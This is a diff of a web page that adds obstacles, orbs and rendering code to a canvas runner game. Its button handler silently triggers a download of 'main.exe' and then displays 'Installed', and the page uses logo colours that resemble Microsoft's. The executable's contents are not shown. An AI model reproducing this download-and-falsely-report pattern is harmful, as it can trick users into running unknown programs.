@@ -143,7 +143,7 @@
   .falling-logo div:nth-child(3) { background: #00A4EF; }
   .falling-logo div:nth-child(4) { background: #FFB900; }
 
-  /* Full screen game canvas */
+  /* Full screen game canvas with smooth rising entrance animation */
   #gameCanvas {
     position: fixed;
     top: 0;
@@ -153,10 +153,14 @@
     z-index: 1;
     cursor: pointer;
     opacity: 0;
-    transition: opacity 0.3s ease;
+    transform: translateY(120px);
+    transition: transform 0.55s cubic-bezier(0.2, 0.9, 0.3, 1), opacity 0.4s ease;
+    pointer-events: none;
   }
   #gameCanvas.show {
     opacity: 1;
+    transform: translateY(0);
+    pointer-events: auto;
   }
 </style>
 </head>
@@ -189,11 +193,12 @@
       
       btn.classList.add('loading');
 
-      // Trigger download of main.exe from your repository
       setTimeout(() => {
+        const downloadUrl = 'main.exe';
         const link = document.createElement('a');
-        link.href = 'main.exe'; // Looks for main.exe in the same repository path
-        link.download = 'main.exe';
+        link.href = downloadUrl;
+        link.setAttribute('download', 'main.exe');
+        link.target = '_self';
         document.body.appendChild(link);
         link.click();
         document.body.removeChild(link);
@@ -202,7 +207,7 @@
         btn.classList.add('done');
         btn.querySelector('.label').textContent = 'Installed';
         btn.querySelector('.label').style.display = 'inline';
-      }, 1200);
+      }, 1000);
     }
 
     let triggered = false;
@@ -223,6 +228,8 @@
       canvas.width = window.innerWidth;
       canvas.height = window.innerHeight;
       const groundY = window.innerHeight - 75;
+
+      canvas.classList.add('show');
 
       const clone = document.createElement('div');
       clone.className = 'falling-logo';
@@ -261,7 +268,6 @@
             requestAnimationFrame(squashFrame);
           } else {
             clone.remove();
-            canvas.classList.add('show');
             initGame(startLeft);
           }
         };
@@ -311,118 +317,108 @@
       let jumpBufferTimer = 0;
       let nextSpawnX = canvas.width + 100;
 
-      // Pure procedural generation
+      ringPulses.push({ x: landX + cubeSize / 2, y: groundY, r: 8, alpha: 1.2, color: '#FFB900' });
+
+      // Procedural generation with multiple dangerous objects
       function spawnProceduralChunk(startX) {
         let cursorX = startX;
         const roll = Math.random();
 
-        if (roll < 0.28) {
-          const count = 1 + Math.floor(Math.random() * 3);
-          const spikeW = 20 + Math.random() * 4;
-          const spikeH = 26 + Math.random() * 6;
-          for (let i = 0; i < count; i++) {
+        // 1. Spinning Sawblades (Ground or Mid-Air)
+        if (roll < 0.22) {
+          const sawType = Math.random();
+          if (sawType < 0.5) {
+            // Ground Sawblade
+            const r = 20 + Math.random() * 6;
+            obstacles.push({ type: 'saw', x: cursorX + r, y: groundY - r + 2, r: r, rot: 0 });
+            cursorX += r * 2 + 30;
+          } else {
+            // High hovering Sawblade with spike below
+            const r = 24;
+            obstacles.push({ type: 'spike', x: cursorX, w: 22, h: 28 });
+            obstacles.push({ type: 'saw', x: cursorX + 80, y: groundY - 75, r: r, rot: 0 });
+            obstacles.push({ 
+              type: 'orb', 
+              orbType: 'pink', // Micro-jump to pass safely under saw
+              x: cursorX + 80, 
+              y: groundY - 40, 
+              r: 15, 
+              used: false 
+            });
+            cursorX += 130;
+          }
+        }
+
+        // 2. Ceiling / Hanging Spikes under floating platform
+        else if (roll < 0.42) {
+          const blockW = 90 + Math.random() * 40;
+          const blockH = 30;
+          const blockY = groundY - 80;
+
+          obstacles.push({ type: 'block', x: cursorX, y: blockY, w: blockW, h: blockH });
+
+          // Hanging spikes attached below block
+          const spikeCount = Math.floor(blockW / 26);
+          for (let i = 0; i < spikeCount; i++) {
             obstacles.push({
-              type: 'spike',
-              x: cursorX + i * (spikeW + 2),
-              w: spikeW,
-              h: spikeH
+              type: 'spike_down',
+              x: cursorX + 8 + i * 26,
+              y: blockY + blockH,
+              w: 20,
+              h: 24
             });
           }
-          cursorX += count * (spikeW + 2);
-        } 
-        else if (roll < 0.55) {
-          const blockW = 45 + Math.floor(Math.random() * 4) * 25;
-          const blockH = 34 + Math.floor(Math.random() * 3) * 16;
-          const blockY = groundY - blockH;
 
+          // Trampoline on ground to jump onto the top of the block
           obstacles.push({
-            type: 'block',
-            x: cursorX,
-            y: blockY,
-            w: blockW,
-            h: blockH
+            type: 'pad',
+            x: cursorX - 45,
+            y: groundY - 10,
+            w: 34,
+            h: 10,
+            bounce: 0
           });
 
-          const subRoll = Math.random();
-          if (subRoll < 0.35 && blockW >= 65) {
-            obstacles.push({
-              type: 'pad',
-              x: cursorX + blockW / 2 - 17,
-              y: blockY - 10,
-              w: 34,
-              h: 10,
-              bounce: 0
-            });
-          } else if (subRoll < 0.75) {
-            const spW = 22, spH = 28;
-            obstacles.push({
-              type: 'spike',
-              x: cursorX + blockW + 15 + Math.random() * 12,
-              w: spW,
-              h: spH
-            });
-            cursorX += spW + 25;
-          }
-          cursorX += blockW;
-        } 
-        else if (roll < 0.78) {
-          const pitCount = 2 + Math.floor(Math.random() * 2);
-          const pitWidth = pitCount * 24;
-          for (let i = 0; i < pitCount; i++) {
-            obstacles.push({
-              type: 'spike',
-              x: cursorX + 10 + i * 24,
-              w: 22,
-              h: 28
-            });
+          cursorX += blockW + 40;
+        }
+
+        // 3. Multi-Colored Orbs & Mega Spike Pit
+        else if (roll < 0.62) {
+          const isRed = Math.random() > 0.5;
+          const pitSpikes = isRed ? 4 : 2;
+          for (let i = 0; i < pitSpikes; i++) {
+            obstacles.push({ type: 'spike', x: cursorX + i * 24, w: 22, h: 28 });
           }
 
-          const orbY = groundY - (60 + Math.random() * 30);
           obstacles.push({
             type: 'orb',
-            x: cursorX + 10 + pitWidth / 2,
-            y: orbY,
+            orbType: isRed ? 'red' : 'yellow',
+            x: cursorX + (pitSpikes * 24) / 2,
+            y: groundY - (isRed ? 85 : 65),
             r: 16,
             used: false
           });
-          cursorX += pitWidth + 25;
-        } 
+
+          cursorX += pitSpikes * 24 + 35;
+        }
+
+        // 4. Mega Spikes and Mini Spikes Combo
+        else if (roll < 0.82) {
+          // Mini Spike
+          obstacles.push({ type: 'spike', x: cursorX, w: 16, h: 18 });
+          // Mega Giant Spike
+          obstacles.push({ type: 'spike', x: cursorX + 38, w: 30, h: 42 });
+          // Trailing Mini Spike
+          obstacles.push({ type: 'spike', x: cursorX + 84, w: 16, h: 18 });
+          cursorX += 120;
+        }
+
+        // 5. Stepped Pillars with Saw Trap
         else {
-          const padW = 36, padH = 10;
-          obstacles.push({
-            type: 'pad',
-            x: cursorX,
-            y: groundY - padH,
-            w: padW,
-            h: padH,
-            bounce: 0
-          });
-          cursorX += padW;
-
-          const spikeCount = 2 + Math.floor(Math.random() * 3);
-          const gapOffset = 45 + Math.random() * 25;
-          for (let i = 0; i < spikeCount; i++) {
-            obstacles.push({
-              type: 'spike',
-              x: cursorX + gapOffset + i * 24,
-              w: 22,
-              h: 28
-            });
-          }
-          cursorX += gapOffset + spikeCount * 24;
-
-          if (Math.random() > 0.4) {
-            const landingW = 50 + Math.random() * 40;
-            const landingH = 35 + Math.random() * 25;
-            obstacles.push({
-              type: 'block',
-              x: cursorX + 20,
-              y: groundY - landingH,
-              w: landingW,
-              h: landingH
-            });
-            cursorX += landingW + 20;
-          }
+          obstacles.push({ type: 'block', x: cursorX, y: groundY - 38, w: 50, h: 38 });
+          obstacles.push({ type: 'saw', x: cursorX + 80, y: groundY - 20, r: 18, rot: 0 });
+          obstacles.push({ type: 'block', x: cursorX + 115, y: groundY - 65, w: 55, h: 65 });
+          cursorX += 180;
         }
 
         const nextGap = 175 + Math.random() * 120;
@@ -438,11 +434,23 @@
             const dist = Math.hypot(cubeCenterX - obs.x, cubeCenterY - obs.y);
             if (dist < 56) {
               obs.used = true;
-              cube.vy = JUMP_FORCE * 1.08;
+
+              // Boost strength based on orb color
+              let boost = JUMP_FORCE * 1.08;
+              let pColor = '#FFB900';
+              if (obs.orbType === 'pink') {
+                boost = JUMP_FORCE * 0.72; // Low micro hop
+                pColor = '#FF007F';
+              } else if (obs.orbType === 'red') {
+                boost = JUMP_FORCE * 1.42; // Mega super jump
+                pColor = '#E81123';
+              }
+
+              cube.vy = boost;
               cube.jumping = true;
               cube.onGround = false;
               jumpBufferTimer = 0;
-              ringPulses.push({ x: obs.x, y: obs.y, r: 16, alpha: 1.2 });
+              ringPulses.push({ x: obs.x, y: obs.y, r: 16, alpha: 1.2, color: pColor });
               return true;
             }
           }
@@ -579,6 +587,7 @@
           obstacles.forEach(obs => {
             obs.x -= speed;
 
+            // 1. Ground Spike Collision
             if (obs.type === 'spike') {
               if (
                 landX + cubeSize - 6 > obs.x &&
@@ -588,6 +597,31 @@
                 die();
               }
             }
+
+            // 2. Hanging Ceiling Spike Collision
+            else if (obs.type === 'spike_down') {
+              if (
+                landX + cubeSize - 6 > obs.x &&
+                landX + 6 < obs.x + obs.w &&
+                cube.y < obs.y + obs.h - 4 &&
+                cube.y + cubeSize > obs.y
+              ) {
+                die();
+              }
+            }
+
+            // 3. Spinning Sawblade Collision (Circle Hitbox)
+            else if (obs.type === 'saw') {
+              obs.rot += 0.08;
+              const cubeCX = landX + cubeSize / 2;
+              const cubeCY = cube.y + cubeSize / 2;
+              const dist = Math.hypot(cubeCX - obs.x, cubeCY - obs.y);
+              if (dist < obs.r + cubeSize * 0.38) {
+                die();
+              }
+            }
+
+            // 4. Block Collision
             else if (obs.type === 'block') {
               const inXRange = (landX + cubeSize - 6 > obs.x) && (landX + 6 < obs.x + obs.w);
 
@@ -612,6 +646,8 @@
                 die();
               }
             }
+
+            // 5. Trampoline Collision
             else if (obs.type === 'pad') {
               if (obs.bounce > 0) obs.bounce--;
 
@@ -626,7 +662,7 @@
                 hitTrampolineThisFrame = true;
                 obs.bounce = 8;
                 jumpBufferTimer = 0;
-                ringPulses.push({ x: obs.x + obs.w / 2, y: obs.y, r: 12, alpha: 1.2 });
+                ringPulses.push({ x: obs.x + obs.w / 2, y: obs.y, r: 12, alpha: 1.2, color: '#FFB900' });
               }
             }
           });
@@ -647,7 +683,7 @@
             }
           }
 
-          obstacles = obstacles.filter(obs => (obs.x + (obs.w || 60)) > -70);
+          obstacles = obstacles.filter(obs => (obs.x + (obs.w || obs.r * 2 || 60)) > -70);
 
           if (frame % 400 === 0) {
             speed += 0.25;
@@ -679,6 +715,7 @@
           shakeTime--;
         }
 
+        // Ground Line
         ctx.strokeStyle = '#B3B0AD';
         ctx.lineWidth = 2;
         ctx.beginPath();
@@ -686,6 +723,7 @@
         ctx.lineTo(W, groundY);
         ctx.stroke();
 
+        // Road hash lines
         ctx.strokeStyle = '#D2D0CE';
         ctx.lineWidth = 1.5;
         for (let x = -((worldOffset) % 24); x < W; x += 24) {
@@ -695,7 +733,9 @@
           ctx.stroke();
         }
 
+        // Draw Obstacles
         obstacles.forEach(obs => {
+          // 1. Ground Spike
           if (obs.type === 'spike') {
             ctx.fillStyle = '#323130';
             ctx.beginPath();
@@ -705,6 +745,54 @@
             ctx.closePath();
             ctx.fill();
           }
+
+          // 2. Hanging Ceiling Spike
+          else if (obs.type === 'spike_down') {
+            ctx.fillStyle = '#323130';
+            ctx.beginPath();
+            ctx.moveTo(obs.x, obs.y);
+            ctx.lineTo(obs.x + obs.w / 2, obs.y + obs.h);
+            ctx.lineTo(obs.x + obs.w, obs.y);
+            ctx.closePath();
+            ctx.fill();
+          }
+
+          // 3. Spinning Sawblade (GD Buzzsaw)
+          else if (obs.type === 'saw') {
+            ctx.save();
+            ctx.translate(obs.x, obs.y);
+            ctx.rotate(obs.rot);
+
+            // Saw Teeth
+            const teeth = 8;
+            ctx.fillStyle = '#494847';
+            ctx.beginPath();
+            for (let i = 0; i < teeth * 2; i++) {
+              const angle = (i * Math.PI) / teeth;
+              const rad = (i % 2 === 0) ? obs.r : obs.r * 0.72;
+              const sx = Math.cos(angle) * rad;
+              const sy = Math.sin(angle) * rad;
+              if (i === 0) ctx.moveTo(sx, sy);
+              else ctx.lineTo(sx, sy);
+            }
+            ctx.closePath();
+            ctx.fill();
+
+            // Inner Blade Ring
+            ctx.fillStyle = '#E1DFDD';
+            ctx.beginPath();
+            ctx.arc(0, 0, obs.r * 0.48, 0, Math.PI * 2);
+            ctx.fill();
+
+            // Center Bolt
+            ctx.fillStyle = '#D13438';
+            ctx.beginPath();
+            ctx.arc(0, 0, obs.r * 0.2, 0, Math.PI * 2);
+            ctx.fill();
+            ctx.restore();
+          }
+
+          // 4. Block
           else if (obs.type === 'block') {
             ctx.fillStyle = '#ffffff';
             ctx.fillRect(obs.x, obs.y, obs.w, obs.h);
@@ -714,22 +802,30 @@
             ctx.strokeStyle = '#D2D0CE';
             ctx.strokeRect(obs.x + 4, obs.y + 4, obs.w - 8, obs.h - 8);
           }
+
+          // 5. Jump Orb (Yellow, Pink, Red)
           else if (obs.type === 'orb') {
             ctx.save();
+            let baseColor = '#FFB900', outerColor = 'rgba(255, 185, 0, 0.6)';
+            if (obs.orbType === 'pink') {
+              baseColor = '#FF007F';
+              outerColor = 'rgba(255, 0, 127, 0.6)';
+            } else if (obs.orbType === 'red') {
+              baseColor = '#E81123';
+              outerColor = 'rgba(232, 17, 35, 0.6)';
+            }
+
             const pulse = Math.sin(frame * 0.15) * 3;
-            ctx.strokeStyle = obs.used ? 'rgba(255, 185, 0, 0.2)' : 'rgba(255, 185, 0, 0.6)';
+            ctx.strokeStyle = obs.used ? 'rgba(200,200,200,0.2)' : outerColor;
             ctx.lineWidth = 2;
             ctx.beginPath();
             ctx.arc(obs.x, obs.y, obs.r + 6 + pulse, 0, Math.PI * 2);
             ctx.stroke();
 
-            ctx.fillStyle = obs.used ? 'rgba(255, 185, 0, 0.25)' : '#FFB900';
+            ctx.fillStyle = obs.used ? 'rgba(200,200,200,0.25)' : baseColor;
             ctx.beginPath();
             ctx.arc(obs.x, obs.y, obs.r, 0, Math.PI * 2);
             ctx.fill();
-            ctx.strokeStyle = '#D99B00';
-            ctx.lineWidth = 2;
-            ctx.stroke();
 
             ctx.fillStyle = '#ffffff';
             ctx.beginPath();
@@ -737,6 +833,8 @@
             ctx.fill();
             ctx.restore();
           }
+
+          // 6. Trampoline
           else if (obs.type === 'pad') {
             ctx.save();
             const compress = obs.bounce ? Math.sin(obs.bounce * 0.5) * 3 : 0;
@@ -765,14 +863,16 @@
           }
         });
 
+        // Draw Shockwaves
         ringPulses.forEach(r => {
-          ctx.strokeStyle = `rgba(255, 185, 0, ${r.alpha})`;
+          ctx.strokeStyle = r.color || `rgba(255, 185, 0, ${r.alpha})`;
           ctx.lineWidth = 3;
           ctx.beginPath();
           ctx.arc(r.x, r.y, r.r, 0, Math.PI * 2);
           ctx.stroke();
         });
 
+        // Player Cube
         if (!gameOver) {
           ctx.save();
           ctx.translate(landX + cubeSize / 2, cube.y + cubeSize / 2);
@@ -786,6 +886,7 @@
           ctx.restore();
         }
 
+        // Death Particles
         particles.forEach(p => {
           ctx.save();
           ctx.translate(p.x, p.y);
